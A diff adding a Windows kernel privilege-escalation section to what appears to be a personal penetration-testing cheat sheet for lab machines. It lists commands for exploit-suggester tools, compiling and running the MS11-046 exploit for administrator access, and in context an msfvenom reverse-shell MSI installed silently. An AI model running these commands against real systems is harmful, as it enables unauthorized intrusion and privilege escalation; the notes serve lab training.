@@ -1915,6 +1915,29 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<port> --platform win
 msiexec /quiet /qn /i reverse.msi
 ```
 
+## Windows - Kernel Exploits wes, windows-exploit-suggester.py
+- In Windows kernel exploit first you need to copy the system info into txt file, we have 2 types of scripts
+- windows-exploit-suggester.py, Windows Exploit Suggester - Next Generation (WES-NG)or wes [walkthrough wes authby pgpractice](https://www.youtube.com/watch?v=U-VLgIDlySA&t=11s)
+- If one exploit is not working always revert the machine
+
+```powershell
+# Python Virtual Environment is running on my KaliLinux at <b>/home/kali/HTB/HTB/Chaos</b>
+source /home/kali/HTB/HTB/Chaos/myenv/bin/activate # To start directly or you can create a new one virtual environment.
+
+#windows-exploit-suggester.py
+python2 windows-exploit-suggester.py --database 2024-10-28-mssb.xls --systeminfo /home/kali/HTB/PGPractice/AuthBy/Systeminfo
+
+#wes
+wes --help
+wes --update 
+wes /home/kali/HTB/PGPractice/AuthBy/Systeminfo -e
+wes /home/kali/HTB/PGPractice/AuthBy/Systeminfo -e -i "Elevation of Privilege" # It will give "Elevation of Privilege" instead of this string search Imapact parameter
+
+# 32 bit compile
+i686-w64-mingw32-gcc 40564.c -o MS11-046.exe -lws2_32 # It will generate file MS11-046.exe
+MS11-046.exe # Run in Windows command line, got administrator access
+```
+
 ## Schedules Tasks
 
 ```bash
